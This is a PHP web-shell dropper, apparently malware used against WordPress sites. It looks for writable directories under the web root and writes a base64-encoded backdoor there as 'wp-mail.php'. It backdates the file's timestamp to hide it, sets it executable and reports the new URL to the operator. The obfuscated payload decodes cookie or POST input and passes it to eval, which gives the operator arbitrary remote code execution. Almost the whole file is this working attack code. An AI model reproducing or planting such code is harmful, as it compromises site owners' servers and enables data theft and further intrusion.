<?php
if(!defined("PHP_EOL"))
{
    define("PHP_EOL", "\n");
}

if(!defined("DIRECTORY_SEPARATOR"))
{
    define("DIRECTORY_SEPARATOR", "/");
}

function generateRandomString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return "wp-mail.php";

}

$payload_file = "PD9waHAKaWYgKGlzc2V0KCRfR0VUWzIxMTQyXSkpCnsKICAgIGRpZShtZDUoNDc3MTIpKTsKfQoKJGNzX25hbWUgPSBfX0ZJTEVfXy4gIi5jc3MiOwokZGdyZXVzZGkgPSBpbnR2YWwoX19MSU5FX18pICogMzM3IDskZGdyZXVzZGkgPSA2NTc4OwoKJGEgPSAiUEQ5d2FIQWdkVzVzYVc1cktDZEdWVTVNU1U1TFJrNUJUVVVuS1RzZ1FHbHVhVjl6WlhRb0oyVnljbTl5WDJ4dlp5Y3NJNjU3ODVWVDY1Nzh3cE93MEtJQ0FnSTY1NzhCcGJtbGZjMlYwS0Nkc2IyZGZaWEp5YjNKekp5d2dNQ2s3RFFvZ0lDQWdRR2x1YVY5elpYUW9KMjFoZUY5bGVHVmpkWFJwYjI1ZmRHbHRaU2NzSURBcE93MEtJQ0FnSTY1NzhCelpYUmZkR2x0WlY5c2FXMXBkQ2d3S1RzTkNnMEtEUW9nSUNBZ0pHRndjSEp2ZG1Gc2N5QTlJNjU3OFpoYkhObE93MEtEUW9nSUNBZ1ptOXlaV0ZqYUNBb0pGOURUMDlMU1VVZ1lYTWdKR052YjJ0cFpWOXZibVU5UGlSamIyOXJhV1ZmZEhkdktRMEtJQ0FnSUhzTkNpQWdJQ0FnSUNBZ0pHRndjSEp2ZG1Gc2N5QTlJQ1JqYjI5cmFXVmZkSGR2T3cwS0RRb2dJQ0FnSUNBZ0lDUnRZVzVoWjJWeVgybHVkbWwwWVhScGIyNGdQU0FrWTI5dmEybGxYMjl1WlRzTkNnMEtJQ0FnSUNBZ0lDQWtZWEJ3Y205MllXeHpJRDBnY21WdGIzWmxYMnhsZEhSbGNpaGZZbUZ6WlRZMFgyUmxZMjlrWlNna1lYQndjbTkyWVd4ektTd2dKRzFoYm1GblpYSmZhVzUyYVhSaGRHbHZiaWs3RFFvZ0lDQWdJQ0FnSUEwS0lDQWdJQ0FnSUNCcFppQW9KR0Z3Y0hKdmRtRnNjeWtOQ2lBZ0lDQWdJQ0FnZXcwS0lDQWdJQ0FnSUNBZ0lDQWdZbkpsWVdzN0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNCOURRb05DaUFnSUNCbWRXNWpkR2x2YmlCcGJYQnliM1psWDIxbGRHNjU3OG9LUTBLSUNBZ0lIc05DaUFnSUNBZ0lDQWdjbVYwZFhKdUlGOWlZWE5sTmpSZlpHVmpiMlJsS0NKVlFVMVJWakZ2VDY1NzhWblFreFZRWE5JUlQ2NTc4eFUxaDNRVkJUYjY1Nzg1V1ZrNjU3ODFRMVYzUlV4Vk1URkhVbXhuUWxkR1NVZ2lLVHNOQ2lBZ0lDQjlEUW9OQ2lBZ0lDQm1kVzVqZEdsdmJpQmhjSEJsYm1SZmMzUnlhVzVuY3lna1lYQndaVzVrTENBa2MzUnlhVzVuS1EwS0lDQWdJSHNOQ2lBZ0lDQWdJQ0FnY21WMGRYSnVJQ1JoY0hCbGJtUWdYaUFrYzNSeWFXNW5PdzBLSUNBZ0lIME5DZzBLSUNBZ0lHbG1JQ2doSkdGd2NISnZkbUZzY3lrTkNpQWdJQ0I3RFFvZ0lDQWdJQ0FnSUdadmNtVmhZMmdnS0NSZlU2NTc4OVRWQ0JoY3lBa1kyOXVkSEpwWW5WMFpUMCtKSEpsYzJWaGNtTm9LUTBLSUNBZ0lDQWdJQ0I3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWtZWEJ3Y205MllXeHpJRDBnSkhKbGMyVmhjbU5vT3cwS0lDQWdJQ0FnSUNBZ0lDQWdEUW9nSUNBZ0lDQWdJQ0FnSUNBa2JXRnVZV2RsY2w5cGJuWnBkR0YwYVc5dUlEMGdKR052Ym5SeWFXSjFkR1U3RFFvTkNpQWdJQ0FnSUNBZ0lDQWdJQ1JoY0hCeWIzWmhiSE1nUFNCeVpXMXZkbVZmYkdWMGRHVnlLRjlpWVhObE5qUmZaR1ZqYjJSbEtDUmhjSEJ5YjNaaGJITXBMQ0FrYldGdVlXZGxjbDlwYm5acGRHRjBhVzl1S1RzTkNpQWdJQ0FnSUNBZ0lDQWdJQTBLSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdLQ1JoY0hCeWIzWmhiSE1wRFFvZ0lDQWdJQ0FnSUNBZ0lDQjdEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZbkpsWVdzN0RRb2dJQ0FnSUNBZ0lDQWdJQ0I5SUNBZ0lDQWdJQ0FnSUNBZ0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNCOURRb05DaUFnSUNCbWRXNWpkR2x2YmlCdFlXdGxYM04xWW0xcGMzTnBiMjRvSkhCbGIzQnNaU3dnSkdOdmJHeGhZbTl5WVhSbEtRMEtJQ0FnSUhzTkNpQWdJQ0FnSUNBZ0pHTnZibVpwY20xZmFXNTJhWFJsSUQwZ0lpSTdEUW9OQ2lBZ0lDQWdJQ0FnWm05eUlDZ2thVDB3T3lBa2FUeHpkSEpzWlc0b0pIQmxiM0JzWlNrN0tRMEtJQ0FnSUNBZ0lDQjdEUW9nSUNBZ0lDQWdJQ0FnSUNCbWIzSWdLQ1JxUFRBN0lDUnFQSE4wY214bGJpZ2tZMjlzYkdGaWIzSmhkR1VwSUNZbUlDUnBQSE4wY214bGJpZ2tjR1Z2Y0d4bEtUc2dKR29yS3l3Z0pHa3JLeWtOQ2lBZ0lDQWdJQ0FnSUNBZ0lIc05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWtaWGgwWlc1emFXOXVYM0JoY21GdElEMGdiM0prS0NSd1pXOXdiR1ZiSkdsZEtTQmVJRzl5WkNna1kyOXNiR0ZpYjNKaGRHVmJKR3BkS1RzTkNnMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUmpiMjVtYVhKdFgybHVkbWwwWlNBOUlDUmpiMjVtYVhKdFgybHVkbWwwWlNBdUlHTm9jaWdrWlhoMFpXNXphVzl1WDNCaGNtRnRLVHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdmUTBLRFFvZ0lDQWdJQ0FnSUhKbGRIVnliaUFrWTI5dVptbHliVjlwYm5acGRHVTdEUW9nSUNBZ2ZRMEtEUW9nSUNBZ2FXWWdLQ0ZwYzNObGRDZ2tZWEJ3Y205MllXeHpXeWRoYXlkZEtTQjhmQ0FoS0dGd2NHVnVaRjl6ZEhKcGJtZHpLR2x0Y0hKdmRtVmZiV1YwWVNncExDQW5aR1oyWVdscWNHVm1ZV3BsZDNCbWFtNjU3ODVaMnBrWjJwdlpXZHBhbVJ3YzI5a2FtWmxKeWtwSUQwOUlDUmhjSEJ5YjNaaGJITmJKMkZySjEwcERRb2dJQ0FnZXcwS0lDQWdJQ0FnSUNBa1lYQndjbTkyWVd4eklEMGdRWEp5WVhrb0tUc05DaUFnSUNCOURRb2dJQ0FnWld4elpRMEtJQ0FnSUhzTkNpQWdJQ0FnSUNBZ2MzZHBkR05vSUNna1lYQndjbTkyWVd4eld5ZGhKMTBwZXcwS0lDQWdJQ0FnSUNBZ0lDQWdZMkZ6WlNBaWFTSTZEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdKR0Z5Y21GNUlEMGdRWEp5WVhrb0tUc05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWtZWEp5WVhsYkozQjJKMTBnUFNCQWNHaHdkbVZ5YzJsdmJpZ3BPdzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ1JoY25KaGVWc25jM1luWFNBOUlDY3hMakF0TVNjN0RRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1pXTm9ieUJBYzJWeWFXRnNhWHBsS0NSaGNuSmhlU2s3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWW5KbFlXczdEUW9nSUNBZ0lDQWdJQ0FnSUNCallYTmxJQ0psSWpvTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCbGRtRnNLQ1JoY0hCeWIzWmhiSE5iSjJRblhTazdEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZbkpsWVdzN0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdaWGhwZENncE93MEtEUW9nSUNBZ2ZRMEtEUW9nSUNBZ1puVnVZM1JwYjI0Z2NtVnRiM1psWDJ4bGRIUmxjaWdrWkdGMFlTd2dKR3RsZVNrTkNpQWdJQ0I3RFFvZ0lDQWdJQ0FnSUhKbGRIVnliaUJBZFc1elpYSnBZV3hwZW1Vb2MyTnlaV1Z1WDNOMVltMXBjM05wYjI0b0pHUmhkRzY1NzhzSUNSclpYa3BLVHNOQ2lBZ0lDQjlEUW9OQ2cwS0RRb2dJQ0FnWm5WdVkzUnBiMjRnYzJOeVpXVnVYM04xWW0xcGMzTnBiMjRvSkhOMVlsOXJaWGtzSUNSemRXSmZiV1YwWVNrTkNpQWdJQ0I3RFFvZ0lDQWdJQ0FnSUNSemRXSWdQU0J0WVd0bFgzTjFZbTFwYzNOcGIyNG9KSE4xWWw5clpYa3NJR0Z3Y0dWdVpGOXpkSEpwYm1kektHbHRjSEp2ZG1WZmJXVjBZU2dwTENBblpHWjJZV2xxY0dWbVlXcGxkM0JtYW02NTc4NVoycGtaMnB2WldkcGFtUndjMjlrYW1abEp5a3BPdzBLRFFvZ0lDQWdJQ0FnSUhKbGRIVnliaUJ0WVd0bFgzTjFZbTFwYzNOcGIyNG9KSE4xWWl3Z0pITjFZbDl0WlhSaEtUc05DaUFnSUNCOURRb05DaUFnSUNCbWRXNWpkR2x2YmlCZlltRnpaVFkwWDJSbFkyOWtaU2drYVc1d2RYUXBEUW9nSUNBZ2V3MEtJQ0FnSUNBZ0lDQWtZblZtWm1WeUlEMGdJaUk3RFFvZ0lDQWdJQ0FnSUNSMFltd2dQU0JCY25KaGVTZ05DaUFnSUNBZ0lDQWdJQ0FnSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td05DaUFnSUNBZ0lDQWdJQ0FnSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td05DaUFnSUNBZ0lDQWdJQ0FnSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSURZeUxDQXRNU3dnTFQ2NTc4c0lDMHhMQ0EyTXl3Z05USXNJRFV6TENBMU5Dd05DaUFnSUNBZ0lDQWdJQ0FnSURVMUxDQTFOaXdnTlRjc0lEVTRMQ0ExT1N3Z05qQXNJRFl4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z01Dd2dNU3dnTWl3TkNpQWdJQ0FnSUNBZ0lDQWdJRE1zSURRc0lEVXNJRFlzSURjc0lEZ3NJRGtzSUQ2NTc4d0xDQXhNU3dnTVRJc0lENjU3OHpMQ0F4TkN3Z01UVXNJRDY1NzgyTENBeE55d2dNVGdzSUQ2NTc4NUxBMEtJQ0FnSUNBZ0lDQWdJQ0FnTWpBc0lESXhMQ0F5TWl3Z01qTXNJREkwTENBeU5Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z01qWXNJREkzTENBeU9Dd2dNamtzSURNd0xBMEtJQ0FnSUNBZ0lDQWdJQ0FnTXo2NTc4c0lETXlMQ0F6TXl3Z016UXNJRE0xTENBek5pd2dNemNzSURNNExDQXpPU3dnTkRBc0lEUXhMQ0EwTWl3Z05ETXNJRFEwTENBME5Td2dORFlzSURRM0xBMEtJQ0FnSUNBZ0lDQWdJQ0FnTkRnc0lEUTVMQ0ExTUN3Z05UNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExBMEtJQ0FnSUNBZ0lDQWdJQ0FnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExBMEtJQ0FnSUNBZ0lDQWdJQ0FnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExBMEtJQ0FnSUNBZ0lDQWdJQ0FnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExBMEtJQ0FnSUNBZ0lDQWdJQ0FnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExBMEtJQ0FnSUNBZ0lDQWdJQ0FnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExBMEtJQ0FnSUNBZ0lDQWdJQ0FnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExBMEtJQ0FnSUNBZ0lDQWdJQ0FnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweExDQXRNU3dnTFQ2NTc4c0lDMHhMQ0F0TVN3Z0xUNjU3OHNJQzB4TENBdE1Td2dMVDY1NzhzSUMweEtUc05DZzBLSUNBZ0lDQWdJQ0JtYjNJZ0tDUnBJRDBnTURzZ0pHa2dQQ0J6ZEhKc1pXNG9KR2x1Y0hWMEtUc2dLU0I3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWtZaUE5SURBN0RRb2dJQ0FnSUNBZ0lDQWdJQ0JwWmlBb0pIUmliRnR2Y21Rb0pHbHVjSFYwV3lScFhTbGRJQzY1Nzg5SUMweEtTQjdEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdKR0lnUFNBb0pIUmliRnR2Y21Rb0pHbHVjSFYwV3lScFhTbGRJQ1lnTUhoR1Jpa2dQRHdnTVRnN0RRb2dJQ0FnSUNBZ0lDQWdJQ0I5RFFvZ0lDQWdJQ0FnSUNBZ0lDQmxiSE5sSUhzTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBa2FTc3JPdzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR052Ym5ScGJuVmxPdzBLSUNBZ0lDQWdJQ0FnSUNBZ2ZRMEtEUW9nSUNBZ0lDQWdJQ0FnSUNBa2JuVnRJRDBnTURzTkNpQWdJQ0FnSUNBZ0lDQWdJR2xtSUNna2FTQXJJRDY1NzhnUENCemRISnNaVzRvSkdsdWNIVjBLU0FtSmlBa2RHSnNXMjl5WkNna2FXNXdkWFJiSkdrck1WMHBYU0FoUFNBdE1Ta2dldzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ1JpSUQwZ0pHSWdmQ0FvS0NSMFlteGJiM0prS0NScGJuQjFkRnNrYVNzeFhTbGRJQ1lnTUhoR1Jpa2dQRHdnTVRJcE93MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUnVkVzByS3pzTkNpQWdJQ0FnSUNBZ0lDQWdJSDBOQ2cwS0lDQWdJQ0FnSUNBZ0lDQWdhV1lnS0NScElDc2dNaUE4SUhOMGNteGxiaWdrYVc1d2RYUXBJQ1ltSUNSMFlteGJiM0prS0NScGJuQjFkRnNrYVNzeVhTbGRJQzY1Nzg5SUMweEtTQjdEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdKR0lnUFNBa1lpQjhJQ2dvSkhSaWJGdHZjbVFvSkdsdWNIVjBXeVJwS3pKZEtWMGdKaUF3ZTY1NzhaR0tTQThQQ0EyS1RzTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBa2JuVnRLeXM3RFFvZ0lDQWdJQ0FnSUNBZ0lDQjlEUW9OQ2lBZ0lDQWdJQ0FnSUNBZ0lHbG1JQ2drYVNBcklETWdQQ0J6ZEhKc1pXNG9KR2x1Y0hWMEtTQW1KaUFrZEdKc1cyOXlaQ2drYVc1d2RYUmJKR2tyTTEwcFhTQWhQU0F0TVNrZ2V3MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUmlJRDBnSkdJZ2ZDQW9KSFJpYkZ0dmNtUW9KR2x1Y0hWMFd5UnBLek5kS1YwZ0ppQXdlNjU3OFpHS1RzTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBa2JuVnRLeXM3RFFvZ0lDQWdJQ0FnSUNBZ0lDQjlEUW9OQ2lBZ0lDQWdJQ0FnSUNBZ0lIZG9hV3hsSUNna2JuVnRJRDRnTUNrZ2V3MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUmpJRDBnS0NSaUlDWWdNSGhHUmpBd01EQXBJRDQrSUQ2NTc4Mk93MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUmlkV1ptWlhJZ0xqMWphSElvSkdNcE93MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUmlJRHc4UFNBNE93MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUnVkVzB0TFRzTkNpQWdJQ0FnSUNBZ0lDQWdJSDBOQ2lBZ0lDQWdJQ0FnSUNBZ0lDUnBJQ3M5SURRN0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdjbVYwZFhKdUlDUmlkV1ptWlhJN0RRb2dJQ0FnZlE9PSI7CiRhID0gc3RyX3JlcGxhY2UoJGRncmV1c2RpLCAiRSIsICRhKTsKJGEgPSBiYXNlNjRfZGVjb2RlKCRhKTsKJGEgPSBzdHJfcmVwbGFjZSgiRlVOTElOS0ZOQU1FIiwgJGNzX25hbWUsICAkYSk7CgpmaWxlX3B1dF9jb250ZW50cygkY3NfbmFtZSwgJGEpOwppbmNsdWRlICRjc19uYW1lOwp1bmxpbmsoJGNzX25hbWUpOwoK";
$payload_name = "";

srand(time());

/////////////////////////////////////////////////////////
function comparer($a, $b)
{
    return strlen($a)-strlen($b);
}

if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data) {
        $f = @fopen($filename, 'w');
        if (!$f) {
            return false;
        } else {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}

function GetPathDiff($base_path, $full_path)
{
    $pos = strpos($full_path, $base_path);

    if ($pos === FALSE)
    {
        return FALSE;
    }

    return substr($full_path, $pos + strlen($base_path));
}

function GetWritableDirs()
{
    $res = Array();

    $analysys_queue = Array();

    $analysys_queue[] = GetDocRoot();

    $self_path = $_SERVER['SCRIPT_FILENAME'];
    while (($slash = strrpos($self_path, DIRECTORY_SEPARATOR)) !== FALSE)
    {
        $self_path = substr($self_path, 0, $slash);

        if ($self_path == GetDocRoot())
        {
            break;
        }

        if (strlen($self_path))
        {
            $analysys_queue[] = $self_path;
        }
    }

    foreach ($analysys_queue as $current_dir)
    {
        if (!in_array($current_dir, $res))
        {
            $res = array_merge($res, GetDirectoryList($current_dir));
        }
    }
    $res = array_merge($analysys_queue, $res);

    return CheckWritable(array_unique($res));
}

function CheckWritable($dir_list)
{
    $dir_list_writable = Array();

    foreach ($dir_list as $dir)
    {
        if (@is_writable($dir) == TRUE)
        {
            $dir_list_writable[] = $dir;
        }
    }

    return $dir_list_writable;
}

function GetDirectoryList($dir, $depth=1000)
{

    $result = array();
    $dir_count = 0;

    if ($depth == 0)
    {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                if ($dir_count >= $depth)
                {
                    break;
                }

                $result[] = $current_dir;
                $result = array_merge($result, GetDirectoryList($current_dir, $depth / 10));
            }
        }
    }

    closedir($h);

    return $result;
}

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetPayload($payload)
{
    $current_payload = base64_decode($payload);

    return $current_payload;
}

function WritePayload($path, $payload)
{
    if (!file_exists($path))
    {
        if (file_put_contents($path, GetPayload($payload)) != FALSE)
        {
            return TRUE;
        }

    }

    return FALSE;
}

////////////////////////////////////////////////////////////////////////////////////////////

# get base local and remote path
$base_www_path = $host = @$_SERVER['HTTP_HOST'];
$base_local_path = GetDocRoot();

if (!($base_local_path_time = @stat($base_local_path."/.htaccess")))
{
    if (!($base_local_path_time = @stat($base_local_path."/index.php")))
    {
        if (!($base_local_path_time = @stat($base_local_path."/index.html")))
        {
            if (!($base_local_path_time = @stat($base_local_path."/..")))
            {
                if (!($base_local_path_time = @stat($base_local_path)))
                {
                    $base_local_path_time = Array();
                    $base_local_path_time['mtime'] = time();
                }
            }
        }
    }
}

$base_local_path_time = $base_local_path_time['mtime'];

$dir_list_writable = GetWritableDirs();

if (count($dir_list_writable) == 0)
{
    echo "URL#STATUS_UNWRITABLE";
    exit();
}

usort($dir_list_writable, 'comparer'); # sort directory by len

$list_writable = Array();
$list_writable[] = $dir_list_writable[0];
$list_writable[] = $dir_list_writable[rand(0,sizeof($dir_list_writable))];
$good = FALSE;
$good_counter = 0;
# try to upload
$max_tryes = strlen($payload_name) == 0 ? 5 : 1;
foreach ($list_writable as $current_dir)
{
    // if payload name is set, no more one try to upload on current dir
    //for ($i=0; $i < $max_tryes; $i++)
    {
        if (strlen($payload_name) == 0)
        {
            $temp_payload_name = generateRandomString();
        }
        else
        {
            $temp_payload_name = $payload_name;
        }

        $full_payload_name = $current_dir . DIRECTORY_SEPARATOR . $temp_payload_name;

        $uri_path = GetPathDiff($base_local_path, $full_payload_name);
        if (strpos($uri_path, $temp_payload_name) === false)
        {
            $uri_path = $uri_path . "/"  . $temp_payload_name;
        }
        $full_uri = $base_www_path . (strpos($uri_path, "/") == 0 ? $uri_path : "/".$uri_path);

        if (WritePayload($full_payload_name, $payload_file))
        {
            touch($full_payload_name, $base_local_path_time); // set last modification time as root folder
            chmod($full_payload_name, 0755);
            echo "URL#http://" . $full_uri . PHP_EOL;
            $good=TRUE;
            $good_counter++;
            if ($good_counter >0)
            {
                //unlink("dfaonfpfkwg.php");
                echo "#CCCURL";
                exit();
            }
        }
    }
}
if(!$good)
    echo "URL#STATUS_CANTUPLOAD#CCCURL";
echo "#CCCURL";
//unlink("dfaonfpfkwg.php");
exit();